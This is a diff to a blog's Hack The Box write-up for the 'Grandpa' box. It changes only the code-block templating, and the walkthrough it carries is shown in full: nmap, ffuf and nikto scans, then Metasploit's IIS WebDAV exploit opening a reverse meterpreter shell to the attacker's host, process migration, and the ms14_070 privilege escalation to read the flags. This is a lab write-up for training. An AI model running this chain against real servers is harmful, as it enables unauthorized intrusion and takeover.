@@ -27,8 +27,7 @@ Up for spending a little time with Grandpa.
 
 Run nmap to get a list of available ports.
 
-{% raw %}
-```sh
+{% capture nmap %}
 ┌──(kali㉿kali)-[~/Documents/htb/grandpa]
 └─$ sudo nmap -sC -sV -A -O -oN nmap 10.10.10.14    
 [sudo] password for kali: 
@@ -64,14 +63,13 @@ HOP RTT      ADDRESS
 
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 23.29 seconds
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=nmap %}
 
 <br />
 Run nmap against all of the ports to see if there are any pesky hidden services.
 
-{% raw %}
-```sh
+{% capture nmapfull %}
 ┌──(kali㉿kali)-[~/Documents/htb/grandpa]
 └─$ sudo nmap -sS -p- -oN nmapfull 10.10.10.14   
 [sudo] password for kali: 
@@ -83,14 +81,13 @@ PORT   STATE SERVICE
 80/tcp open  http
 
 Nmap done: 1 IP address (1 host up) scanned in 126.20 seconds
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=nmapfull %}
 
 <br />
 Run ffuf to try and brute-force any interesting directories or files.
 
-{% raw %}
-```sh
+{% capture ffuf %}
 ┌──(kali㉿kali)-[~/Documents/htb/grandpa]
 └─$ ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://10.10.10.14/FUZZ -e .txt,.bak,.asp -fw 131
 
@@ -121,14 +118,13 @@ Images                  [Status: 301, Size: 149, Words: 9, Lines: 2, Duration: 3
 IMAGES                  [Status: 301, Size: 149, Words: 9, Lines: 2, Duration: 19ms]
 _private                [Status: 403, Size: 1529, Words: 173, Lines: 30, Duration: 52ms]
 :: Progress: [882236/882236] :: Job [1/1] :: 1315 req/sec :: Duration: [0:10:41] :: Errors: 0 ::
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=ffuf %}
 
 <br />
 Run the nikto vulnerability scanner to see what it says.
 
-{% raw %}
-```sh
+{% capture nikto %}
 ┌──(kali㉿kali)-[~/Documents/htb/grandpa]
 └─$ nikto -h http://10.10.10.14 -o nikto.txt
 - Nikto v2.5.0
@@ -170,14 +166,13 @@ Run the nikto vulnerability scanner to see what it says.
 + End Time:           2025-01-29 18:14:55 (GMT11) (253 seconds)
 ---------------------------------------------------------------------------
 + 1 host(s) tested
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=nikto %}
 
 <br />
 Open msfconsole and search for the microsoft iis 6 that was indicated as the IIS version in the nmap results.
 
-{% raw %}
-```sh
+{% capture msfconsole %}
 ┌──(kali㉿kali)-[~/Documents/htb/grandpa]
 └─$ msfconsole -q
 msf6 > search microsoft iis 6.0
@@ -192,25 +187,23 @@ Matching Modules
 
 
 Interact with a module by name or index. For example info 1, use 1 or use exploit/windows/iis/iis_webdav_scstoragepathfromurl
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=msfconsole %}
 
 <br />
 Choose to use the exploit/windows/iis/iis_webdav_scstoragepathfromurl option.  You can choose this by just using use 1 (or whatever number it is for you).
 
-{% raw %}
-```sh
+{% capture chooseexploit %}
 msf6 > use 1
 [*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
 msf6 exploit(windows/iis/iis_webdav_scstoragepathfromurl) >
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=chooseexploit %}
 
 <br />
 Show the options available for the exploit and set the LHOST and RHOSTS options.  Set LHOST to the tun0 interface IP address and set RHOST to Grandpa's IP.  Run the exploit.
 
-{% raw %}
-```sh
+{% capture runexploit %}
 msf6 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > set lhost tun0
 lhost => 10.10.16.12
 msf6 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > set lhost tun0
@@ -224,14 +217,13 @@ msf6 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > exploit
 [*] Meterpreter session 1 opened (10.10.16.12:4444 -> 10.10.10.14:1030) at 2025-01-29 21:48:20 +1100
 
 meterpreter > 
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=runexploit %}
 
 <br />
 Run ps to get a list of running process and migrate to a process that belongs to our user.
 
-{% raw %}
-```sh
+{% capture processlist %}
 meterpreter > ps
 
 Process List
@@ -272,14 +264,13 @@ Process List
 meterpreter > migrate 3480
 [*] Migrating from 3528 to 3480...
 [*] Migration completed successfully.
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=processlist %}
 
 <br />
 Background the session and search for local_exploit_suggester.
 
-{% raw %}
-```sh
+{% capture backgroundsess %}
 meterpreter > 
 Background session 1? [y/N]  y
 [-] Unknown command: y. Run the help command for more details.
@@ -294,14 +285,13 @@ Matching Modules
 
 
 Interact with a module by name or index. For example info 0, use 0 or use post/multi/recon/local_exploit_suggester
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=backgroundsess %}
 
 <br />
 Use the local_exploit_suggester option and show the options.
 
-{% raw %}
-```sh
+{% capture chooseprivescoption %}
 msf6 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > use 0
 [*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
 msf6 post(multi/recon/local_exploit_suggester) > show options
@@ -315,14 +305,13 @@ Module options (post/multi/recon/local_exploit_suggester):
 
 
 View the full module info with the info, or info -d command.
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=chooseprivescoption %}
 
 <br />
 Set the session to the session number from the meterpreter session that we established earlies.  Run the exploit.
 
-{% raw %}
-```sh
+{% capture setsession %}
 msf6 post(multi/recon/local_exploit_suggester) > set session 1
 session => 1
 msf6 post(multi/recon/local_exploit_suggester) > exploit
@@ -350,14 +339,13 @@ msf6 post(multi/recon/local_exploit_suggester) > exploit
 <snip>
 
 [*] Post module execution completed
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=setsession %}
 
 <br />
 Select the ms14_070_tcpip_ioctl exploit and show the options for that exploit.
 
-{% raw %}
-```sh
+{% capture showprivescoptions %}
 msf6 exploit(windows/local/ms14_058_track_popup_menu) > use exploit/windows/local/ms14_070_tcpip_ioctl
 [*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
 msf6 exploit(windows/local/ms14_070_tcpip_ioctl) > show options
@@ -387,14 +375,13 @@ Exploit target:
 
 
 View the full module info with the info, or info -d command.
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=showprivescoptions %}
 
 <br />
 Set the options for the exploit and run the exploit.
 
-{% raw %}
-```sh
+{% capture runprivesc %}
 msf6 exploit(windows/local/ms14_070_tcpip_ioctl) > set session 1
 session => 1
 msf6 exploit(windows/local/ms14_070_tcpip_ioctl) > set lhost tun0
@@ -411,14 +398,13 @@ msf6 exploit(windows/local/ms14_070_tcpip_ioctl) > exploit
 [*] Meterpreter session 2 opened (10.10.16.12:4444 -> 10.10.10.14:1031) at 2025-01-29 23:53:57 +1100
 
 meterpreter >
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=runprivesc %}
 
 <br />
 Get the user.txt flag.
 
-{% raw %}
-```sh
+{% capture userflag %}
 C:\Documents and Settings\Harry\Desktop>type user.txt
 type user.txt
 <redacted>
@@ -434,14 +420,13 @@ Ethernet adapter Local Area Connection:
    IP Address. . . . . . . . . . . . : 10.10.10.14
    Subnet Mask . . . . . . . . . . . : 255.255.255.0
    Default Gateway . . . . . . . . . : 10.10.10.2
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='cmd' title='cmd.exe' content=userflag %}
 
 <br />
 Get the root.txt flag.
 
-{% raw %}
-```sh
+{% capture rootflag %}
 C:\Documents and Settings\Administrator\Desktop>type root.txt
 type root.txt
 <redacted>
@@ -457,8 +442,8 @@ Ethernet adapter Local Area Connection:
    IP Address. . . . . . . . . . . . : 10.10.10.14
    Subnet Mask . . . . . . . . . . . : 255.255.255.0
    Default Gateway . . . . . . . . . : 10.10.10.2
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='cmd' title='cmd.exe' content=rootflag %}
 
 <br />
 And with that we wrap up this box.  See you in the next one.
